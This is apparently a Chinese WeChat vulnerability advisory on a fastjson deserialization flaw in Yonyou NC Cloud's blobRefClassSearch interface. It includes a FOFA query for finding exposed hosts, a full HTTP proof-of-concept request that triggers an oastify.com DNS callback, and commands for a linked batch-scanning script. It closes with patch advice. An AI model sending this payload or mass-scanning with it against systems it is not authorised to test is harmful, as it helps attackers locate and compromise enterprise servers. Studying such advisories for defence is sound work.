<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4GcZj852hw2hiRdHnehxqQ)

**免责声明：本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，若利用本文提供的内容或工具造成任何直接或间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关。**

**fofa**

```
app="用友-NC-Cloud"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgx8VDaflYNpm5AbGFhK8Uu9uZD5kPfcXJO9w4qic7gJXsYsFjiawNMgCbTj2BDOMOfNQHtHaXsLvdpw/640?wx_fmt=png&from=appmsg)

**资产页面**

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgx8VDaflYNpm5AbGFhK8Uu9icEBSyXQhD8E6QAO8gBFqgDEibA91GMIUa1ICTdEGlH0UPCoVyKoCpng/640?wx_fmt=png&from=appmsg)

**一、漏洞简述**

用友 NC 以 “全球化集团管控、行业化解决方案、全程化电子商务、平台化应用集成” 的管理业务理念而设计，采用 J2EE 架构和先进开放的集团级开发平台 UAP，形成了集团管控 8 大领域 15 大行业 68 个细分行业的解决方案，是中国大企业集团管理信息化应用系统的首选。其接口 blobRefClassSearch 存在 fastjson 反序列化漏洞，攻击者可通过该漏洞执行任意命令控制服务器。

****二、漏洞检测 poc****

```
POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/json
Content-Length: 146
{"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"111111.j3nmzhym834g0t5n9dv5kupkrbx2ls9h.oastify.com\"\}\\}\}"}

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgx8VDaflYNpm5AbGFhK8Uu9jIrltuhfkFdKoSSZibLMBSntic9yficicSibIx4kKumPap7DeePzoDXDrMA/640?wx_fmt=png&from=appmsg)

dnslog 回显

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgx8VDaflYNpm5AbGFhK8Uu9FfQxzC4qt8sVvEjICcAMaFiakC5Tw5GVVXOs6DZRCnX9iahK17QZcRHw/640?wx_fmt=png&from=appmsg)

‍

****三、漏洞检测脚本****

****安全测试人员可通过该脚本进行探测自身服务是否存在此漏洞：****

https://github.com/ATonysan/poc-exp/blob/main/YongYouNCC_blobRefClassSearch_fastjsonDeserialization.py

批量检测:

python YongYouNCC_blobRefClassSearch_fastjsonDeserialization.py -f url.txt

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgx8VDaflYNpm5AbGFhK8Uu9eSianKylVqIvYmv719jwybdDlOibQgbUbnx4BLsfl5QeZgU7ZbAv0iaCw/640?wx_fmt=png&from=appmsg)

单个 url 检测漏洞:

python YongYouNCC_blobRefClassSearch_fastjsonDeserialization.py -u url

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgx8VDaflYNpm5AbGFhK8Uu9hcFibfSY9pZrYsSjraUIHngCqYcUdlxwPdF66SuYGHu4XRXVG2k581g/640?wx_fmt=png&from=appmsg)

**四、修复**

官方已更新补丁，请升级至最新版本。

官网地址：https://www.yonyou.com/